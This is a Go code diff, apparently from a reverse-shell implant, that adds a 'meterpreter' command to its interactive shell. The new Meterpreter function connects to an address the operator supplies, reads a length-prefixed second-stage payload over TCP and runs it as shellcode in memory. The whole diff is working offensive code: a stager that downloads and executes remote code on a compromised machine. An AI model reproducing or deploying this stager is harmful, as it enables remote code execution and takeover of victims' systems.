@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
+	"encoding/binary"
 	"encoding/hex"
 	"net"
 	"os"
@@ -41,7 +42,10 @@ func InteractiveShell(conn net.Conn) {
 			switch argv[0] {
 			case "meterpreter":
 				if len(argv) > 1 {
-					shell.Meterpreter(argv[1])
+					ok, err := Meterpreter(argv[1])
+					if !ok {
+						conn.Write([]byte(err.Error() + "\n"))
+					}
 				}
 			case "inject":
 				if len(argv) > 1 {
@@ -63,6 +67,36 @@ func InteractiveShell(conn net.Conn) {
 		}
 		conn.Write([]byte(prompt))
 	}
+}
+
+func Meterpreter(address string) (bool, error) {
+	var (
+		stage2LengthBuf []byte = make([]byte, 4)
+		stage2LengthInt uint32
+		conn            net.Conn
+		err             error
+	)
+
+	if conn, err = net.Dial("tcp", address); err != nil {
+		return false, err
+	}
+
+	defer conn.Close()
+
+	if _, err = conn.Read(stage2LengthBuf); err != nil {
+		return false, err
+	}
+
+	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
+	stage2Buf := make([]byte, stage2LengthInt)
+
+	if _, err = conn.Read(stage2Buf); err != nil {
+		return false, err
+	}
+
+	shell.ExecShellcode(stage2Buf)
+
+	return true, nil
 }
 
 func RunShell(conn net.Conn) {
